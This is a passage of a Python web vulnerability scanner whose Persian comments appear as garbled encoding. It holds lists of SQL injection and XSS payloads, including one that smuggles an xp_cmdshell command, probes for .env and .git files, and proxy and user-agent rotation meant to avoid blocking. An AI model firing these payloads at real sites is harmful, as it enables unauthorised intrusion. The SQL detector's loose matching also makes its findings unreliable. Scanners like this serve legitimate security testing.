import requests
import socket
import time
import random
import json
import threading
import sys
import re
import os
import dns.resolver
import ssl
import certifi
from urllib.parse import urlparse, urljoin, quote
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
from datetime import datetime
import yaml
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ØªÙ†Ø¸ÛŒÙ…Ø§Øª Ù„Ø§Ú¯â€ŒÚ¯ÛŒØ±ÛŒ
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('security_scanner.log', encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)

class AdvancedSecurityScanner:
    def __init__(self, max_threads=5, delay_range=(1, 3), timeout=10):
        self.vulnerabilities = []
        self.scan_results = {}
        self.session = requests.Session()
        self.max_threads = max_threads
        self.delay_range = delay_range
        self.timeout = timeout
        self.set_random_user_agent()
        self.legal_warning_displayed = False
        self.allowed_domains = []
        self.proxy_config = None
        self.auth_config = None
        self.driver = None
        self.performance_metrics = {}
        
    def display_legal_warning(self, target_url):
        """Ù†Ù…Ø§ÛŒØ´ Ù‡Ø´Ø¯Ø§Ø± Ù‚Ø§Ù†ÙˆÙ†ÛŒ"""
        if not self.legal_warning_displayed:
            warning = f"""
            âš ï¸  Ù‡Ø´Ø¯Ø§Ø± Ù‚Ø§Ù†ÙˆÙ†ÛŒ Ùˆ Ø§Ø®Ù„Ø§Ù‚ÛŒ âš ï¸
            
            Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² Ø§ÛŒÙ† Ø§Ø³Ú©Ù†Ø± Ø¨Ø¯ÙˆÙ† Ú©Ø³Ø¨ Ù…Ø¬ÙˆØ² Ú©ØªØ¨ÛŒ Ø§Ø² Ù…Ø§Ù„Ú© Ø³Ø§ÛŒØªØŒ
            Ù…Ù…Ú©Ù† Ø§Ø³Øª ØºÛŒØ±Ù‚Ø§Ù†ÙˆÙ†ÛŒ Ø¨Ø§Ø´Ø¯ Ùˆ Ù¾ÛŒÚ¯Ø±Ø¯ Ù‚Ø§Ù†ÙˆÙ†ÛŒ Ø¯Ø§Ø´ØªÙ‡ Ø¨Ø§Ø´Ø¯.
            
            Ù‡Ø¯Ù Ø§Ø³Ú©Ù†: {target_url}
            
            Ø§ÛŒÙ† Ø§Ø¨Ø²Ø§Ø± ÙÙ‚Ø· Ø¨Ø±Ø§ÛŒ ØªØ³Øª Ø³Ø§ÛŒØªâ€ŒÙ‡Ø§ÛŒÛŒ Ú©Ù‡ Ù…Ø¬ÙˆØ² ØµØ±ÛŒØ­ Ø¯Ø§Ø±ÛŒØ¯ Ùˆ
            Ø¨Ø±Ø§ÛŒ Ø§Ù‡Ø¯Ø§Ù Ø¢Ù…ÙˆØ²Ø´ÛŒ Ø·Ø±Ø§Ø­ÛŒ Ø´Ø¯Ù‡ Ø§Ø³Øª.
            
            Ø¨Ø§ Ø§Ø¯Ø§Ù…Ù‡ Ú©Ø§Ø±ØŒ Ø´Ù…Ø§ ØªØ£ÛŒÛŒØ¯ Ù…ÛŒâ€ŒÚ©Ù†ÛŒØ¯ Ú©Ù‡:
            1. Ù…Ø¬ÙˆØ² Ù„Ø§Ø²Ù… Ø¨Ø±Ø§ÛŒ ØªØ³Øª Ø³Ø§ÛŒØª Ù‡Ø¯Ù Ø±Ø§ Ø¯Ø§Ø±ÛŒØ¯
            2. Ù…Ø³Ø¦ÙˆÙ„ÛŒØª Ù‡Ø±Ú¯ÙˆÙ†Ù‡ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ù†Ø§Ø¯Ø±Ø³Øª Ø¨Ø± Ø¹Ù‡Ø¯Ù‡ Ø´Ù…Ø§Ø³Øª
            3. ÙÙ‚Ø· Ø¨Ø±Ø§ÛŒ Ø§Ù‡Ø¯Ø§Ù Ø§Ù…Ù†ÛŒØªÛŒ Ùˆ Ø¢Ù…ÙˆØ²Ø´ÛŒ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ù…ÛŒâ€ŒÚ©Ù†ÛŒØ¯
            
            Ø¢ÛŒØ§ Ù…ÛŒâ€ŒØ®ÙˆØ§Ù‡ÛŒØ¯ Ø§Ø¯Ø§Ù…Ù‡ Ø¯Ù‡ÛŒØ¯ØŸ (y/n)
            """
            print(warning)
            choice = input().strip().lower()
            if choice != 'y':
                print("Ø®Ø±ÙˆØ¬ Ø§Ø² Ø¨Ø±Ù†Ø§Ù…Ù‡...")
                sys.exit(0)
            self.legal_warning_displayed = True
    
    def set_random_user_agent(self):
        """ØªÙ†Ø¸ÛŒÙ… User-Agent ØªØµØ§Ø¯ÙÛŒ Ø¨Ø±Ø§ÛŒ Ø¬Ù„ÙˆÚ¯ÛŒØ±ÛŒ Ø§Ø² Ù…Ø³Ø¯ÙˆØ¯ÛŒ"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
        ]
        self.session.headers.update({
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        })
    
    def set_proxy(self, proxy_url):
        """ØªÙ†Ø¸ÛŒÙ… Ù¾Ø±ÙˆÚ©Ø³ÛŒ Ø¨Ø±Ø§ÛŒ Ø¬Ù„ÙˆÚ¯ÛŒØ±ÛŒ Ø§Ø² Ø¨Ù„Ø§Ú© Ø´Ø¯Ù† IP Ø§ØµÙ„ÛŒ"""
        self.session.proxies = {
            'http': proxy_url,
            'https': proxy_url
        }
        print(f"Ù¾Ø±ÙˆÚ©Ø³ÛŒ ØªÙ†Ø¸ÛŒÙ… Ø´Ø¯: {proxy_url}")
    
    def login(self, login_url, username_field, password_field, username, password):
        """ÙˆØ±ÙˆØ¯ Ø¨Ù‡ Ø³ÛŒØ³ØªÙ… Ø¨Ø§ Ù†Ø§Ù… Ú©Ø§Ø±Ø¨Ø±ÛŒ Ùˆ Ø±Ù…Ø² Ø¹Ø¨ÙˆØ±"""
        login_data = {
            username_field: username,
            password_field: password
        }
        
        try:
            response = self.session.post(login_url, data=login_data, timeout=self.timeout)
            if "logout" in response.text.lower() or response.status_code == 200:
                print("âœ… Ù„Ø§Ú¯ÛŒÙ† Ù…ÙˆÙÙ‚ÛŒØªâ€ŒØ¢Ù…ÛŒØ² Ø¨ÙˆØ¯")
                return True
            return False
        except Exception as e:
            print(f"âŒ Ø®Ø·Ø§ Ø¯Ø± Ù„Ø§Ú¯ÛŒÙ†: {str(e)}")
            return False
    
    def init_selenium_driver(self):
        """Ø±Ø§Ù‡â€ŒØ§Ù†Ø¯Ø§Ø²ÛŒ Ø¯Ø±Ø§ÛŒÙˆØ± Selenium Ø¨Ø±Ø§ÛŒ ØªØ³Øªâ€ŒÙ‡Ø§ÛŒ JavaScript"""
        try:
            chrome_options = Options()
            chrome_options.add_argument("--headless")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument(f"user-agent={random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15'
            ])}")
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.set_page_load_timeout(30)
            return True
        except Exception as e:
            print(f"âŒ Ø®Ø·Ø§ Ø¯Ø± Ø±Ø§Ù‡â€ŒØ§Ù†Ø¯Ø§Ø²ÛŒ Selenium: {str(e)}")
            return False
    
    def safe_request(self, url, method='GET', data=None, headers=None, timeout=None, allow_redirects=True):
        """Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø§Ù…Ù† Ø¨Ø§ Ù…Ø¯ÛŒØ±ÛŒØª Ø®Ø·Ø§ Ùˆ ØªØ£Ø®ÛŒØ±"""
        if timeout is None:
            timeout = self.timeout
            
        try:
            delay = random.uniform(*self.delay_range)
            time.sleep(delay)
            
            request_headers = self.session.headers.copy()
            if headers:
                request_headers.update(headers)
            
            if method.upper() == 'GET':
                response = self.session.get(url, headers=request_headers, timeout=timeout, 
                                          verify=certifi.where(), allow_redirects=allow_redirects)
            elif method.upper() == 'POST':
                response = self.session.post(url, data=data, headers=request_headers, timeout=timeout,
                                           verify=certifi.where(), allow_redirects=allow_redirects)
            else:
                response = self.session.request(method, url, data=data, headers=request_headers,
                                              timeout=timeout, verify=certifi.where(), allow_redirects=allow_redirects)
            
            return response
        except requests.exceptions.SSLError as e:
            logging.error(f"Ø®Ø·Ø§ÛŒ SSL Ø¯Ø± {url}: {str(e)}")
            return None
        except requests.exceptions.Timeout:
            logging.error(f"Timeout Ø¯Ø± Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø¨Ù‡ {url}")
            return None
        except requests.exceptions.ConnectionError:
            logging.error(f"Ø®Ø·Ø§ÛŒ Ø§ØªØµØ§Ù„ Ø¨Ù‡ {url}")
            return None
        except requests.exceptions.RequestException as e:
            logging.error(f"Ø®Ø·Ø§ÛŒ Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø¨Ù‡ {url}: {str(e)}")
            return None
    
    def is_domain_allowed(self, domain):
        """Ø¨Ø±Ø±Ø³ÛŒ Ù…Ø¬Ø§Ø² Ø¨ÙˆØ¯Ù† Ø¯Ø§Ù…Ù†Ù‡ Ø¨Ø±Ø§ÛŒ Ø§Ø³Ú©Ù†"""
        if not self.allowed_domains:
            return True
        return domain in self.allowed_domains
    
    def load_config(self, config_file):
        """Ø¨Ø§Ø±Ú¯Ø°Ø§Ø±ÛŒ ØªÙ†Ø¸ÛŒÙ…Ø§Øª Ø§Ø² ÙØ§ÛŒÙ„ YAML"""
        try:
            with open(config_file, 'r', encoding='utf-8') as f:
                config = yaml.safe_load(f)
            
            self.max_threads = config.get('max_threads', 5)
            self.delay_range = tuple(config.get('delay_range', [1, 3]))
            self.allowed_domains = config.get('allowed_domains', [])
            self.timeout = config.get('timeout', 10)
            
            # ØªÙ†Ø¸ÛŒÙ… Ù¾Ø±ÙˆÚ©Ø³ÛŒ Ø§Ú¯Ø± ÙˆØ¬ÙˆØ¯ Ø¯Ø§Ø±Ø¯
            if 'proxy' in config:
                self.set_proxy(config['proxy'])
            
            # ØªÙ†Ø¸ÛŒÙ…Ø§Øª Ø§Ø­Ø±Ø§Ø² Ù‡ÙˆÛŒØª
            if 'authentication' in config:
                self.auth_config = config['authentication']
            
            print("âœ… ØªÙ†Ø¸ÛŒÙ…Ø§Øª Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø¨Ø§Ø±Ú¯Ø°Ø§Ø±ÛŒ Ø´Ø¯")
            return True
        except Exception as e:
            print(f"âŒ Ø®Ø·Ø§ Ø¯Ø± Ø¨Ø§Ø±Ú¯Ø°Ø§Ø±ÛŒ ØªÙ†Ø¸ÛŒÙ…Ø§Øª: {str(e)}")
            return False
    
    def scan_website(self, url):
        """Ø§Ø³Ú©Ù† Ø§ØµÙ„ÛŒ Ø³Ø§ÛŒØª"""
        if not url.startswith('http'):
            url = 'http://' + url
            
        parsed_url = urlparse(url)
        domain = parsed_url.hostname
        
        if not self.is_domain_allowed(domain):
            print(f"âŒ Ø®Ø·Ø§: Ø¯Ø§Ù…Ù†Ù‡ {domain} Ø¯Ø± Ù„ÛŒØ³Øª Ø¯Ø§Ù…Ù†Ù‡â€ŒÙ‡Ø§ÛŒ Ù…Ø¬Ø§Ø² Ø¨Ø±Ø§ÛŒ Ø§Ø³Ú©Ù† Ù†ÛŒØ³Øª.")
            return None
        
        self.display_legal_warning(url)
        
        # Ø§Ù†Ø¬Ø§Ù… Ù„Ø§Ú¯ÛŒÙ† Ø§Ú¯Ø± ØªÙ†Ø¸ÛŒÙ…Ø§Øª ÙˆØ¬ÙˆØ¯ Ø¯Ø§Ø±Ø¯
        if self.auth_config:
            print("ğŸ” Ø¯Ø± Ø­Ø§Ù„ Ø§Ù†Ø¬Ø§Ù… Ù„Ø§Ú¯ÛŒÙ†...")
            login_success = self.login(
                self.auth_config['login_url'],
                self.auth_config['username_field'],
                self.auth_config['password_field'],
                self.auth_config['username'],
                self.auth_config['password']
            )
            if not login_success:
                print("âš ï¸  Ø§Ø¯Ø§Ù…Ù‡ Ø§Ø³Ú©Ù† Ø¨Ø¯ÙˆÙ† Ø¯Ø³ØªØ±Ø³ÛŒ Ø§Ø­Ø±Ø§Ø² Ù‡ÙˆÛŒØª")
        
        print(f"ğŸš€ Ø´Ø±ÙˆØ¹ Ø§Ø³Ú©Ù† Ø§Ù…Ù†ÛŒØªÛŒ Ù¾ÛŒØ´Ø±ÙØªÙ‡ Ø¨Ø±Ø§ÛŒ: {url}")
        logging.info(f"Ø´Ø±ÙˆØ¹ Ø§Ø³Ú©Ù† Ø¨Ø±Ø§ÛŒ: {url}")
        
        # Ø±Ø§Ù‡â€ŒØ§Ù†Ø¯Ø§Ø²ÛŒ Selenium Ø¨Ø±Ø§ÛŒ Ø³Ø§ÛŒØªâ€ŒÙ‡Ø§ÛŒ JavaScript
        self.init_selenium_driver()
        
        # Ø¨Ø±Ø±Ø³ÛŒâ€ŒÙ‡Ø§ÛŒ Ù…Ø®ØªÙ„Ù
        checks = [
            self.check_dns_security,
            self.check_ssl_tls,
            self.check_security_headers,
            self.check_exposed_files,
            self.check_sql_injection,
            self.check_xss,
            self.check_csrf,
            self.check_file_inclusion,
            self.check_open_ports,
            self.check_info_leakage,
            self.check_admin_pages,
            self.check_cors_misconfig,
            self.check_clickjacking,
            self.check_directory_traversal,
            self.check_http_methods,
            self.check_server_info,
            self.check_backup_files,
            self.check_ssrf,
            self.check_idor,
            self.check_performance
        ]
        
        # Ø§Ø¬Ø±Ø§ÛŒ Ù…ÙˆØ§Ø²ÛŒ Ú†Ú©â€ŒÙ‡Ø§
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            future_to_check = {
                executor.submit(check, url): check.__name__ for check in checks
            }
            
            for future in as_completed(future_to_check):
                check_name = future_to_check[future]
                try:
                    future.result()
                except Exception as e:
                    logging.error(f"Ø®Ø·Ø§ Ø¯Ø± Ø§Ù†Ø¬Ø§Ù… Ø¨Ø±Ø±Ø³ÛŒ {check_name}: {str(e)}")
                    print(f"âŒ Ø®Ø·Ø§ Ø¯Ø± Ø§Ù†Ø¬Ø§Ù… Ø¨Ø±Ø±Ø³ÛŒ {check_name}: {str(e)}")
        
        # Ø¨Ø³ØªÙ† Ø¯Ø±Ø§ÛŒÙˆØ± Selenium
        if self.driver:
            self.driver.quit()
                
        return self.generate_report(url)
    
    def check_dns_security(self, url):
        """Ø¨Ø±Ø±Ø³ÛŒ Ø§Ù…Ù†ÛŒØª DNS"""
        print("ğŸ” Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø±Ø±Ø³ÛŒ Ø§Ù…Ù†ÛŒØª DNS...")
        parsed_url = urlparse(url)
        domain = parsed_url.hostname
        
        try:
            resolver = dns.resolver.Resolver()
            answers = resolver.resolve(domain, 'DNSKEY')
            self.scan_results['dnssec'] = "âœ… ÙØ¹Ø§Ù„ - DNSSEC Ù¾ÛŒØ§Ø¯Ù‡â€ŒØ³Ø§Ø²ÛŒ Ø´Ø¯Ù‡ Ø§Ø³Øª"
        except:
            self.scan_results['dnssec'] = "âŒ ØºÛŒØ±ÙØ¹Ø§Ù„ - DNSSEC Ù¾ÛŒØ§Ø¯Ù‡â€ŒØ³Ø§Ø²ÛŒ Ù†Ø´Ø¯Ù‡ Ø§Ø³Øª"
        
        record_types = ['A', 'AAAA', 'MX', 'TXT', 'CNAME', 'NS']
        dns_records = {}
        
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(domain, record_type)
                dns_records[record_type] = [str(r) for r in answers]
            except:
                dns_records[record_type] = "ÛŒØ§ÙØª Ù†Ø´Ø¯"
        
        self.scan_results['dns_records'] = dns_records
    
    def check_ssl_tls(self, url):
        """Ø¨Ø±Ø±Ø³ÛŒ SSL/TLS"""
        print("ğŸ” Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø±Ø±Ø³ÛŒ SSL/TLS...")
        parsed_url = urlparse(url)
        
        if parsed_url.scheme != 'https':
            self.scan_results['ssl_tls'] = "âš ï¸ Ø³Ø§ÛŒØª Ø§Ø² HTTPS Ø§Ø³ØªÙØ§Ø¯Ù‡ Ù†Ù…ÛŒâ€ŒÚ©Ù†Ø¯"
            return
            
        try:
            context = ssl.create_default_context(cafile=certifi.where())
            with socket.create_connection((parsed_url.hostname, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=parsed_url.hostname) as ssock:
                    cert = ssock.getpeercert()
                    
                    expiry_date = ssl.cert_time_to_seconds(cert['notAfter'])
                    current_time = time.time()
                    days_until_expiry = (expiry_date - current_time) // 86400
                    
                    ssl_version = ssock.version()
                    
                    if days_until_expiry < 30:
                        self.scan_results['ssl_tls'] = f"âš ï¸ Ù‡Ø´Ø¯Ø§Ø±: Ú¯ÙˆØ§Ù‡ÛŒ SSL Ø¯Ø± {days_until_expiry} Ø±ÙˆØ² Ø¯ÛŒÚ¯Ø± Ù…Ù†Ù‚Ø¶ÛŒ Ù…ÛŒâ€ŒØ´ÙˆØ¯. Ù†Ø³Ø®Ù‡ SSL: {ssl_version}"
                    else:
                        self.scan_results['ssl_tls'] = f"âœ… Ø§Ù…Ù† - Ú¯ÙˆØ§Ù‡ÛŒ SSL Ù…Ø¹ØªØ¨Ø± Ø¨Ø±Ø§ÛŒ {days_until_expiry} Ø±ÙˆØ² Ø¯ÛŒÚ¯Ø±. Ù†Ø³Ø®Ù‡ SSL: {ssl_version}"
        except Exception as e:
            self.scan_results['ssl_tls'] = f"âŒ Ù…Ø´Ú©Ù„ Ø¯Ø± Ù¾ÛŒÚ©Ø±Ø¨Ù†Ø¯ÛŒ SSL/TLS: {str(e)}"
    
    def check_security_headers(self, url):
        """Ø¨Ø±Ø±Ø³ÛŒ Ù‡Ø¯Ø±Ù‡Ø§ÛŒ Ø§Ù…Ù†ÛŒØªÛŒ"""
        print("ğŸ“‹ Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø±Ø±Ø³ÛŒ Ù‡Ø¯Ø±Ù‡Ø§ÛŒ Ø§Ù…Ù†ÛŒØªÛŒ...")
        
        response = self.safe_request(url)
        if not response:
            self.scan_results['security_headers'] = "Ù†Ø§Ù…Ø´Ø®Øµ - Ø¨Ø±Ø±Ø³ÛŒ Ù‡Ø¯Ø±Ù‡Ø§ÛŒ Ø§Ù…Ù†ÛŒØªÛŒ Ø¨Ø§ Ø®Ø·Ø§ Ù…ÙˆØ§Ø¬Ù‡ Ø´Ø¯"
            return
            
        headers = response.headers
        
        security_headers = {
            'X-Frame-Options': 'Ø­ÙØ§Ø¸Øª Ø¯Ø± Ø¨Ø±Ø§Ø¨Ø± Ú©Ù„ÛŒÚ©â€ŒØ¬Ú©ÛŒÙ†Ú¯',
            'X-XSS-Protection': 'Ø­ÙØ§Ø¸Øª Ø¯Ø± Ø¨Ø±Ø§Ø¨Ø± XSS',
            'X-Content-Type-Options': 'Ø¬Ù„ÙˆÚ¯ÛŒØ±ÛŒ Ø§Ø² MIME sniffing',
            'Strict-Transport-Security': 'Ø§Ø¬Ø¨Ø§Ø± Ø¨Ù‡ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² HTTPS',
            'Content-Security-Policy': 'Ø³ÛŒØ§Ø³Øª Ø§Ù…Ù†ÛŒØª Ù…Ø­ØªÙˆØ§',
            'Referrer-Policy': 'Ú©Ù†ØªØ±Ù„ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø§Ø±Ø¬Ø§Ø¹',
            'Permissions-Policy': 'Ú©Ù†ØªØ±Ù„ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ ÙˆÛŒÚ˜Ú¯ÛŒâ€ŒÙ‡Ø§ÛŒ Ù…Ø±ÙˆØ±Ú¯Ø±'
        }
        
        missing_headers = []
        existing_headers = {}
        
        for header, description in security_headers.items():
            if header in headers:
                existing_headers[header] = {
                    'value': headers[header],
                    'description': description
                }
            else:
                missing_headers.append(header)
        
        self.scan_results['security_headers'] = {
            'existing': existing_headers,
            'missing': missing_headers
        }
    
    def check_exposed_files(self, url):
        """Ø¨Ø±Ø±Ø³ÛŒ ÙØ§ÛŒÙ„â€ŒÙ‡Ø§ÛŒ Ø¯Ø± Ù…Ø¹Ø±Ø¶ Ø®Ø·Ø±"""
        print("ğŸ“ Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø±Ø±Ø³ÛŒ ÙØ§ÛŒÙ„â€ŒÙ‡Ø§ÛŒ Ø¯Ø± Ù…Ø¹Ø±Ø¶ Ø®Ø·Ø±...")
        
        exposed_files = [
            '/.env', '/.git/config', '/.htaccess', '/web.config',
            '/phpinfo.php', '/info.php', '/test.php', '/admin/config.php',
            '/backup.zip', '/backup.sql', '/robots.txt', '/sitemap.xml',
            '/.DS_Store', '/.well-known/security.txt', '/crossdomain.xml',
            '/clientaccesspolicy.xml', '/phpmyadmin/', '/adminer.php'
        ]
        
        found_files = []
        
        for file_path in exposed_files:
            file_url = url.rstrip('/') + file_path
            response = self.safe_request(file_url)
            
            if response and response.status_code == 200:
                found_files.append({
                    'path': file_path,
                    'url': file_url,
                    'size': len(response.content),
                    'status_code': response.status_code
                })
        
        if found_files:
            self.vulnerabilities.append("ÙØ§ÛŒÙ„â€ŒÙ‡Ø§ÛŒ Ø¯Ø± Ù…Ø¹Ø±Ø¶ Ø®Ø·Ø±")
            self.scan_results['exposed_files'] = found_files
        else:
            self.scan_results['exposed_files'] = "âœ… Ù‡ÛŒÚ† ÙØ§ÛŒÙ„ Ø®Ø·Ø±Ù†Ø§Ú©ÛŒ ÛŒØ§ÙØª Ù†Ø´Ø¯"
    
    def check_sql_injection(self, url):
        """Ø¨Ø±Ø±Ø³ÛŒ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ ØªØ²Ø±ÛŒÙ‚ SQL Ù¾ÛŒØ´Ø±ÙØªÙ‡"""
        print("ğŸ’‰ Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø±Ø±Ø³ÛŒ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ ØªØ²Ø±ÛŒÙ‚ SQL...")
        
        response = self.safe_request(url)
        if not response:
            self.scan_results['sql_injection'] = "Ù†Ø§Ù…Ø´Ø®Øµ - Ø¨Ø±Ø±Ø³ÛŒ SQL Injection Ø¨Ø§ Ø®Ø·Ø§ Ù…ÙˆØ§Ø¬Ù‡ Ø´Ø¯"
            return
            
        soup = BeautifulSoup(response.text, 'html.parser')
        test_params = self.find_test_params(url, soup)
        
        sql_payloads = [
            "' OR '1'='1'--",
            "' UNION SELECT NULL,NULL--",
            "'; EXEC xp_cmdshell('dir')--",
            "' OR EXISTS(SELECT * FROM information_schema.tables)--",
            "' OR 1=1--",
            "admin'--",
            "' OR SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' UNION ALL SELECT NULL,NULL,NULL,NULL--",
            "'/**/AND/**/1=1--"
        ]
        
        vulnerable_points = []
        
        for param_name, param_url in test_params:
            if param_name.startswith("FORM_POST:"):
                # Ù¾Ø±Ø¯Ø§Ø²Ø´ ÙØ±Ù…â€ŒÙ‡Ø§ÛŒ POST
                form_url = param_name.split(":", 1)[1]
                form_data = self.extract_form_data(soup, form_url)
                
                for payload in sql_payloads:
                    test_data = {}
                    for field_name, field_value in form_data.items():
                        test_data[field_name] = payload if field_value == "PARAM_VALUE" else field_value
                    
                    start_time = time.time()
                    response = self.safe_request(form_url, method='POST', data=test_data, timeout=15)
                    response_time = time.time() - start_time
                    
                    if response and self.detect_sql_injection(response.text, response_time):
                        vulnerable_points.append({
                            'parameter': 'POST_FORM',
                            'url': form_url,
                            'payload': payload,
                            'response_time': response_time,
                            'method': 'POST'
                        })
                        break
            else:
                # Ù¾Ø±Ø¯Ø§Ø²Ø´ Ù¾Ø§Ø±Ø§Ù…ØªØ±Ù‡Ø§ÛŒ GET
                for payload in sql_payloads:
                    test_url = param_url.replace('PARAM_VALUE', quote(payload))
                    start_time = time.time()
                    response = self.safe_request(test_url, timeout=15)
                    response_time = time.time() - start_time
                    
                    if response and self.detect_sql_injection(response.text, response_time):
                        vulnerable_points.append({
                            'parameter': param_name,
                            'url': test_url,
                            'payload': payload,
                            'response_time': response_time,
                            'method': 'GET'
                        })
                        break
        
        if vulnerable_points:
            self.vulnerabilities.append("ØªØ²Ø±ÛŒÙ‚ SQL")
            self.scan_results['sql_injection'] = vulnerable_points
        else:
            self.scan_results['sql_injection'] = "âœ… Ø§Ù…Ù† - Ù‡ÛŒÚ† Ù†Ø´Ø§Ù†Ù‡â€ŒØ§ÛŒ Ø§Ø² Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ ØªØ²Ø±ÛŒÙ‚ SQL ÛŒØ§ÙØª Ù†Ø´Ø¯"
    
    def extract_form_data(self, soup, form_url):
        """Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§ÛŒ ÙØ±Ù… Ø§Ø² HTML"""
        forms = soup.find_all('form')
        for form in forms:
            form_action = form.get('action', '')
            current_form_url = urljoin(form_url, form_action)
            
            if current_form_url == form_url:
                form_data = {}
                inputs = form.find_all('input')
                
                for input_tag in inputs:
                    name = input_tag.get('name')
                    value = input_tag.get('value', '')
                    if name:
                        form_data[name] = value if value else "PARAM_VALUE"
                
                return form_data
        
        return {}
    
    def detect_sql_injection(self, content, response_time):
        """ØªØ´Ø®ÛŒØµ Ù¾Ø§Ø³Ø®â€ŒÙ‡Ø§ÛŒ Ù…Ø«Ø¨Øª SQL Injection"""
        indicators = [
            'sql', 'syntax', 'mysql', 'ora-', 'postgresql',
            'you have an error in your sql syntax',
            'warning: mysql', 'unclosed quotation mark',
            'undefined function', 'mysqli_fetch',
            'Microsoft OLE DB Provider', 'ODBC Driver',
            'PostgreSQL query failed'
        ]
        
        content_lower = content.lower()
        
        if response_time > 5:
            return True
            
        return any(indicator in content_lower for indicator in indicators)
    
    def check_xss(self, url):
        """Ø¨Ø±Ø±Ø³ÛŒ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ XSS Ù¾ÛŒØ´Ø±ÙØªÙ‡"""
        print("ğŸ¯ Ø¯Ø± Ø­Ø§Ù„ Ø¨Ø±Ø±Ø³ÛŒ Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ XSS...")
        
        response = self.safe_request(url)
        if not response:
            self.scan_results['xss'] = "Ù†Ø§Ù…Ø´Ø®Øµ - Ø¨Ø±Ø±Ø³ÛŒ XSS Ø¨Ø§ Ø®Ø·Ø§ Ù…ÙˆØ§Ø¬Ù‡ Ø´Ø¯"
            return
            
        soup = BeautifulSoup(response.text, 'html.parser')
        test_params = self.find_test_params(url, soup)
        
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")',
            '" onmouseover="alert(\'XSS\')"',
            '<body onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')">',
            '"><script>alert("XSS")</script>',
            'javascript:prompt("XSS")',
            '"><img src=x onerror=alert("XSS")>'
        ]
        
        vulnerable_points = []
        
        for param_name, param_url in test_params:
            if param_name.startswith("FORM_POST:"):
                form_url = param_name.split(":", 1)[1]
                form_data = self.extract_form_data(soup, form_url)
                
                for payload in xss_payloads:
                    test_data = {}
                    for field_name, field_value in form_data.items():
                        test_data[field_name] = payload if field_value == "PARAM_VALUE" else field_value
                    
                    response = self.safe_request(form_url, method='POST', data=test_data)
                    
                    if response and payload in response.text:
                        vulnerable_points.append({
                            'parameter': 'POST_FORM',
                            'url': form_url,
                            'payload': payload,
                            'method': 'POST'
                        })
                        break
            else:
                for payload in xss_payloads:
                    test_url = param_url.replace('PARAM_VALUE', quote(payload))
                    response = self.safe_request(test_url)
                    
                    if response and payload in response.text:
                        vulnerable_points.append({
                            'parameter': param_name,
                            'url': test_url,
                            'payload': payload,
                            'method': 'GET'
                        })
                        break
        
        if vulnerable_points:
            self.vulnerabilities.append("XSS")
            self.scan_results['xss'] = vulnerable_points
        else:
            self.scan_results['xss'] = "âœ… Ø§Ù…Ù† - Ù‡ÛŒÚ† Ù†Ø´Ø§Ù†Ù‡â€ŒØ§ÛŒ Ø§Ø² Ø¢Ø³ÛŒØ¨â€ŒÙ¾Ø°ÛŒØ±ÛŒ XSS ÛŒØ§ÙØª Ù†Ø´Ø¯"
    
